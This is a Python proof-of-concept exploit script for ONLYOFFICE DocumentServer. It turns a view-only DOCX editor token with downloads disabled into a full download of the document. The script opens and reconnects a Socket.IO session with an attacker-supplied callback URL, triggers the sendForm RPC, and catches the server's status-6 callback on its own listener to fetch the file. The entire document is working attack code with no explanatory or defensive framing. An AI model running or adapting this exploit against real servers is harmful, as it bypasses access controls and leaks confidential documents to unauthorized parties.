#!/usr/bin/env python3
"""Recover a reconstructed DOCX through a view-only editor session."""

from __future__ import annotations

import argparse
import json
import secrets
import threading
import time
import uuid
import zipfile
from collections import deque
from collections.abc import Callable
from dataclasses import dataclass
from http.server import BaseHTTPRequestHandler
from io import BytesIO
from pathlib import Path
from typing import Any
from urllib.parse import quote, urljoin, urlsplit

import requests
from onlyoffice_common import (
    DocumentServer,
    ExploitError,
    ListenerServer,
    OutputFile,
    add_network_args,
    decode_jwt,
    entrypoint,
    http_url,
    network_options,
    port_number,
    read_token,
    status,
)


@dataclass(frozen=True)
class EditorContext:
    key: str
    file_type: str
    title: str
    source_url: str
    callback_url: str
    user_id: str
    user_name: str
    language: str
    permissions: dict[str, Any]
    coediting_mode: str


@dataclass(frozen=True)
class CallbackResult:
    key: str
    status: int
    url: str | None


def run_callback_url(base_url: str) -> str:
    """Append a run secret without exposing it in progress messages."""
    parsed = urlsplit(base_url)
    path = parsed.path.rstrip("/") + "/" + secrets.token_urlsafe(32)
    return parsed._replace(path=path).geturl()


def editor_context(claims: dict[str, Any]) -> EditorContext:
    document = claims.get("document")
    editor = claims.get("editorConfig")
    if not isinstance(document, dict) or not isinstance(editor, dict):
        raise ExploitError("token lacks document or editorConfig claims")
    if editor.get("mode") != "view":
        raise ExploitError("token is not for a view-only editor session")

    permissions = document.get("permissions")
    if not isinstance(permissions, dict):
        raise ExploitError("token lacks document permissions")
    if permissions.get("download") is not False:
        raise ExploitError("token must set document.permissions.download to false")

    key = document.get("key")
    source_url = document.get("url")
    callback_url = editor.get("callbackUrl")
    user = editor.get("user")
    if not isinstance(key, str) or not key:
        raise ExploitError("token lacks document.key")
    if not isinstance(source_url, str) or not source_url:
        raise ExploitError("token lacks document.url")
    if not isinstance(callback_url, str) or not callback_url:
        raise ExploitError("token lacks editorConfig.callbackUrl")
    if not isinstance(user, dict) or user.get("id") is None:
        raise ExploitError("token lacks editorConfig.user.id")

    file_type = document.get("fileType")
    if not isinstance(file_type, str) or file_type.lower() != "docx":
        raise ExploitError("this PoC requires a DOCX editor token")
    coediting = editor.get("coEditing")
    coediting_mode = "strict"
    if isinstance(coediting, dict) and coediting.get("mode") in {"fast", "strict"}:
        coediting_mode = coediting["mode"]

    user_id = str(user["id"])
    return EditorContext(
        key=key,
        file_type=file_type.lower(),
        title=str(document.get("title") or "document.docx"),
        source_url=source_url,
        callback_url=callback_url,
        user_id=user_id,
        user_name=str(user.get("name") or user_id),
        language=str(editor.get("lang") or "en"),
        permissions=dict(permissions),
        coediting_mode=coediting_mode,
    )


def engine_packets(body: bytes) -> list[str]:
    try:
        return body.decode().split("\x1e")
    except UnicodeDecodeError as error:
        raise ExploitError("DocumentServer returned invalid Engine.IO data") from error


class PollingSocket:
    def __init__(self, client: DocumentServer, document_key: str):
        self.url = f"{client.origin}/doc/{quote(document_key, safe='')}/c/socket.io/"
        self.client = client
        self.timeout = min(client.timeout, 60.0)
        self.sid: str | None = None
        self.connected = False
        self.counter = 0
        self.messages: deque[dict[str, Any]] = deque()

    def params(self, include_sid: bool = True) -> dict[str, str]:
        self.counter += 1
        params = {
            "EIO": "4",
            "transport": "polling",
            "t": f"{int(time.time() * 1000)}-{self.counter}",
        }
        if include_sid and self.sid:
            params["sid"] = self.sid
        return params

    def request(self, method: str, **kwargs: Any) -> requests.Response:
        try:
            response = self.client.request(
                method,
                self.url,
                timeout=kwargs.pop("timeout", self.timeout),
                **kwargs,
            )
            response.raise_for_status()
            return response
        except requests.RequestException as error:
            raise ExploitError(f"Engine.IO {method} failed ({type(error).__name__})") from None

    def post(self, packet: str, timeout: float | None = None) -> None:
        response = self.request(
            "POST",
            params=self.params(),
            data=packet.encode(),
            headers={"Content-Type": "text/plain;charset=UTF-8"},
            timeout=timeout or self.timeout,
        )
        if response.content not in {b"", b"ok", b"OK"}:
            raise ExploitError("DocumentServer rejected an Engine.IO packet")

    def poll(self, timeout: float) -> list[str]:
        response = self.request(
            "GET",
            params=self.params(),
            timeout=max(0.01, min(self.timeout, timeout)),
        )
        return engine_packets(response.content)

    def handle(self, packet: str) -> bool:
        if packet.startswith("2"):
            self.post("3" + packet[1:])
        elif packet == "1":
            self.connected = False
            raise ExploitError("DocumentServer closed the Engine.IO connection")
        elif packet.startswith("44"):
            self.connected = False
            raise ExploitError("Socket.IO authorization failed")
        elif packet.startswith("40"):
            self.connected = True
            return True
        elif packet.startswith("42"):
            try:
                event = json.loads(packet[2:])
            except json.JSONDecodeError as error:
                raise ExploitError("DocumentServer returned an invalid Socket.IO event") from error
            if (
                isinstance(event, list)
                and len(event) > 1
                and event[0] == "message"
                and isinstance(event[1], dict)
            ):
                if len(self.messages) >= 1024:
                    raise ExploitError("too many pending DocumentServer messages")
                self.messages.append(event[1])
        return False

    def connect(self, auth: dict[str, str], timeout: float) -> None:
        response = self.request("GET", params=self.params(include_sid=False))
        handshake: dict[str, Any] | None = None
        for packet in engine_packets(response.content):
            if packet.startswith("0"):
                try:
                    value = json.loads(packet[1:])
                except json.JSONDecodeError as error:
                    raise ExploitError("DocumentServer returned an invalid handshake") from error
                if isinstance(value, dict):
                    handshake = value
        if handshake is None or not isinstance(handshake.get("sid"), str):
            raise ExploitError("Engine.IO handshake did not contain a session ID")

        self.sid = handshake["sid"]
        self.post("40" + json.dumps(auth, separators=(",", ":")))
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            for packet in self.poll(deadline - time.monotonic()):
                if self.handle(packet):
                    return
        raise ExploitError("Socket.IO connection timed out")

    def send(self, message: dict[str, Any]) -> None:
        if not self.connected:
            raise ExploitError("Socket.IO connection is not established")
        event = json.dumps(["message", message], separators=(",", ":"))
        self.post("42" + event)

    def wait_for(
        self,
        predicate: Callable[[dict[str, Any]], bool],
        timeout: float,
    ) -> dict[str, Any]:
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            for _ in range(len(self.messages)):
                message = self.messages.popleft()
                if predicate(message):
                    return message
                self.messages.append(message)
            for packet in self.poll(deadline - time.monotonic()):
                self.handle(packet)
        raise ExploitError("timed out waiting for a DocumentServer message")

    def close(self) -> None:
        if self.sid:
            try:
                if self.connected:
                    self.post("41", timeout=2)
                self.post("1", timeout=2)
            except ExploitError:
                pass
        self.connected = False
        self.sid = None


class CallbackListener:
    def __init__(
        self,
        host: str,
        port: int,
        path: str,
        cert: Path | None,
        key: Path | None,
        expected_key: str,
    ):
        self.path = path
        self.results: list[CallbackResult] = []
        self.condition = threading.Condition()
        self.armed_at: float | None = None
        owner = self

        class Handler(BaseHTTPRequestHandler):
            def setup(self) -> None:
                super().setup()
                self.connection.settimeout(10)

            def log_message(self, _format: str, *_args: object) -> None:
                pass

            def do_POST(self) -> None:
                received_at = time.monotonic()
                if urlsplit(self.path).path != owner.path:
                    self.send_error(404)
                    return
                try:
                    length = int(self.headers.get("Content-Length", "0"))
                    if not 0 < length <= 1024 * 1024:
                        self.send_error(413)
                        return
                    body = json.loads(self.rfile.read(length))
                    if not isinstance(body, dict) or body.get("key") != expected_key:
                        self.send_error(400)
                        return
                    result = CallbackResult(
                        key=str(body["key"]),
                        status=int(body["status"]),
                        url=body.get("url") if isinstance(body.get("url"), str) else None,
                    )
                except (KeyError, TypeError, ValueError, UnicodeError, OSError):
                    self.send_error(400)
                    return

                with owner.condition:
                    if owner.armed_at is not None and received_at >= owner.armed_at:
                        if len(owner.results) >= 64:
                            owner.results.pop(0)
                        owner.results.append(result)
                        owner.condition.notify_all()
                reply = b'{"error":0}'
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(reply)))
                self.end_headers()
                self.wfile.write(reply)

        self.server = ListenerServer((host, port), Handler, cert, key)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)

    def __enter__(self):
        self.thread.start()
        return self

    def __exit__(self, *_args: object) -> None:
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=5)

    def arm(self) -> None:
        with self.condition:
            self.results.clear()
            self.armed_at = time.monotonic()

    def wait_for(self, document_key: str, status: int, timeout: float) -> CallbackResult:
        deadline = time.monotonic() + timeout
        with self.condition:
            if self.armed_at is None:
                raise ExploitError("callback listener has not been armed for sendForm")
            while True:
                for result in self.results:
                    if result.key == document_key and result.status == status:
                        return result
                remaining = deadline - time.monotonic()
                if remaining <= 0:
                    raise ExploitError(f"timed out waiting for callback status {status}")
                self.condition.wait(remaining)


def initial_auth(context: EditorContext, token: str) -> dict[str, Any]:
    return {
        "type": "auth",
        "docid": context.key,
        "documentCallbackUrl": context.callback_url,
        "token": token,
        "user": {"id": context.user_id, "username": context.user_name},
        "editorType": 0,
        "lastOtherSaveTime": -1,
        "block": [],
        "sessionId": None,
        "sessionTimeConnect": None,
        "sessionTimeIdle": 0,
        "documentFormatSave": 65,
        "isCloseCoAuthoring": False,
        "openCmd": {
            "c": "open",
            "id": context.key,
            "userid": context.user_id,
            "format": context.file_type,
            "url": context.source_url,
            "title": context.title,
            "nobase64": True,
            "outputformat": 8193,
            "convertToOrigin": "",
        },
        "lang": context.language,
        "mode": "view",
        "permissions": context.permissions,
        "encrypted": False,
        "IsAnonymousUser": False,
        "timezoneOffset": 0,
        "coEditingMode": context.coediting_mode,
        "jwtOpen": token,
        "jwtSession": None,
        "time": round(time.monotonic() * 1000),
        "supportAuthChangesAck": False,
    }


def reconnect_auth(
    context: EditorContext,
    token: str,
    session_token: str,
    callback_url: str,
) -> dict[str, Any]:
    session_claims = decode_jwt(session_token)
    editor = session_claims.get("editorConfig")
    document = session_claims.get("document")
    if not isinstance(editor, dict) or not isinstance(document, dict):
        raise ExploitError("server session JWT lacks editor context")
    return {
        "type": "auth",
        "docid": context.key,
        "documentCallbackUrl": callback_url,
        "token": token,
        "user": {"id": context.user_id, "username": context.user_name},
        "editorType": 0,
        "lastOtherSaveTime": -1,
        "block": [],
        "sessionId": None,
        "sessionTimeConnect": editor.get("ds_sessionTimeConnect"),
        "sessionTimeIdle": 0,
        "documentFormatSave": 65,
        "isCloseCoAuthoring": bool(editor.get("ds_isCloseCoAuthoring")),
        "openCmd": None,
        "lang": context.language,
        "mode": "view",
        "permissions": context.permissions,
        "encrypted": bool(document.get("ds_encrypted")),
        "IsAnonymousUser": False,
        "timezoneOffset": 0,
        "coEditingMode": context.coediting_mode,
        "jwtOpen": None,
        "jwtSession": session_token,
        "time": round(time.monotonic() * 1000),
        "supportAuthChangesAck": False,
    }


def wait_for_auth(
    socket: PollingSocket,
    context: EditorContext,
    timeout: float,
) -> str | None:
    message = socket.wait_for(lambda value: value.get("type") == "auth", timeout)
    if message.get("result") != 1:
        raise ExploitError("DocumentServer rejected the editor authentication")
    index = message.get("indexUser")
    participants = message.get("participants")
    if not isinstance(participants, list):
        raise ExploitError("DocumentServer authentication omitted the participant list")
    viewer = any(
        isinstance(participant, dict)
        and participant.get("indexUser") == index
        and str(participant.get("idOriginal")) == context.user_id
        and participant.get("view") is True
        for participant in participants
    )
    if not viewer:
        raise ExploitError("DocumentServer did not classify the session as view-only")
    session_token = message.get("jwt")
    return session_token if isinstance(session_token, str) else None


def verify_session_token(token: str, context: EditorContext) -> None:
    claims = decode_jwt(token)
    document = claims.get("document")
    editor = claims.get("editorConfig")
    if not isinstance(document, dict) or document.get("key") != context.key:
        raise ExploitError("server session JWT changed the document key")
    permissions = document.get("permissions")
    if not isinstance(permissions, dict) or permissions.get("download") is not False:
        raise ExploitError("server session JWT did not preserve download=false")
    if not isinstance(editor, dict) or editor.get("ds_sessionTimeConnect") is None:
        raise ExploitError("DocumentServer did not issue a reconnectable session JWT")


def validate_docx(document: bytes) -> None:
    try:
        with zipfile.ZipFile(BytesIO(document)) as archive:
            if "word/document.xml" not in archive.namelist():
                raise ExploitError("downloaded file is not a DOCX")
    except zipfile.BadZipFile as error:
        raise ExploitError("downloaded file is not a DOCX") from error


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    add_network_args(parser)
    parser.add_argument("--token-file", required=True, type=Path, help="view-only DOCX Editor JWT")
    parser.add_argument("--callback-url", required=True, help="target-reachable callback URL")
    parser.add_argument("--listen-host", default="0.0.0.0", help="local callback bind address")
    parser.add_argument("--listen-port", type=port_number, help="local port (default: callback URL port)")
    parser.add_argument("--output", required=True, type=Path, help="local reconstructed DOCX destination")
    parser.add_argument(
        "--overwrite", action="store_true", help="replace an existing local output on success"
    )
    parser.add_argument("--tls-cert", type=Path, help="listener certificate, for direct HTTPS delivery")
    parser.add_argument("--tls-key", type=Path, help="listener private key")
    args = parser.parse_args()
    options = network_options(args)
    callback_base = http_url(args.callback_url, "--callback-url")
    callback_url = run_callback_url(callback_base)
    callback = urlsplit(callback_url)
    listen_port = args.listen_port or callback.port or (443 if callback.scheme == "https" else 80)
    if bool(args.tls_cert) != bool(args.tls_key):
        raise ExploitError("--tls-cert and --tls-key must be supplied together")
    if args.tls_cert and callback.scheme != "https":
        raise ExploitError("a TLS listener requires an HTTPS --callback-url")
    if args.output.resolve() == args.token_file.resolve():
        raise ExploitError("--output would replace the input token file")
    token = read_token(args.token_file)
    context = editor_context(decode_jwt(token))
    with OutputFile(args.output, overwrite=args.overwrite) as output, DocumentServer(**options) as client:
        with CallbackListener(
            args.listen_host, listen_port, callback.path or "/", args.tls_cert, args.tls_key, context.key
        ) as listener:
            status(
                f"[*] callback listener on {args.listen_host}:{listen_port}; "
                f"public URL prefix {callback_base}; per-run suffix withheld"
            )
            if callback.scheme == "https" and not args.tls_cert:
                status("[*] public HTTPS URL requires TLS termination forwarding to this HTTP listener")
            initial, reconnected = PollingSocket(client, context.key), PollingSocket(client, context.key)
            try:
                status("[*] opening document with the view-only token")
                initial.connect({"token": token}, args.timeout)
                initial.send(initial_auth(context, token))
                session_token = wait_for_auth(initial, context, args.timeout)
                if session_token is None:
                    raise ExploitError("DocumentServer did not return a Session JWT")
                verify_session_token(session_token, context)
                opened = initial.wait_for(lambda value: value.get("type") == "documentOpen", args.timeout)
                data = opened.get("data")
                if not isinstance(data, dict) or data.get("status") != "ok":
                    raise ExploitError("document did not open")
                status("[+] view-only session established; server Session JWT received")
                reconnected.connect({"session": session_token}, args.timeout)
                reconnected.send(reconnect_auth(context, token, session_token, callback_url))
                wait_for_auth(reconnected, context, args.timeout)
                status("[*] reconnected; invoking rpc/sendForm with the replacement callback")
                response_key = uuid.uuid4().hex
                listener.arm()
                reconnected.send(
                    {
                        "type": "rpc",
                        "responseKey": response_key,
                        "data": {"type": "sendForm", "formdata": {"formsdata": []}},
                    }
                )
                rpc = reconnected.wait_for(
                    lambda value: value.get("type") == "rpc" and value.get("responseKey") == response_key,
                    args.timeout,
                )
                rpc_data = rpc.get("data")
                if not isinstance(rpc_data, dict) or rpc_data.get("code") != 0:
                    raise ExploitError("sendForm RPC was rejected or failed")
                result = listener.wait_for(context.key, 6, args.timeout)
                if result.url is None:
                    raise ExploitError("status 6 callback did not contain a download URL")
                status("[+] correlated status-6 callback received (sender signature not verified)")
                document = client.download(urljoin(client.origin + "/", result.url))
                validate_docx(document)
                output.write(document)
                status(f"[+] saved reconstructed DOCX ({len(document)} bytes) to {args.output}")
                return 0
            finally:
                reconnected.close()
                initial.close()


if __name__ == "__main__":
    entrypoint(main)
